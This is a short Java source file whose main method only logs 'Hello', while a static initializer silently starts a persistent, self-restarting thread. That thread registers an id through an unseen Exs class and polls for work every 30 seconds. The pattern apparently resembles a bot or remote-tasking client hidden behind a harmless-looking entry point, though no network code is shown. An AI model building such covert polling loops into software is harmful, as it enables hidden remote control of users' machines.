package gq.glowman554;

import gq.glowman554.utils.Log;

public class Entry {
    public static String id = null;

    public static void entry() throws Exception {
        Exs exs = new Exs();

        if (id == null) {
            id = exs.register();
        }

        Log.log("Got id " + id);

        while (true) {
            exs.pool_for_work();
            Thread.sleep(30000);
        }
    }

    public static void main(String[] args) {
        Log.log("Hello");
    }

    static {
        Log.init();

        new Thread(() -> {
            while (true) {
                try {
                    Entry.entry();
                } catch (Exception e) {
                    Log.log(e);
                }
            }
        }).start();
    }
}
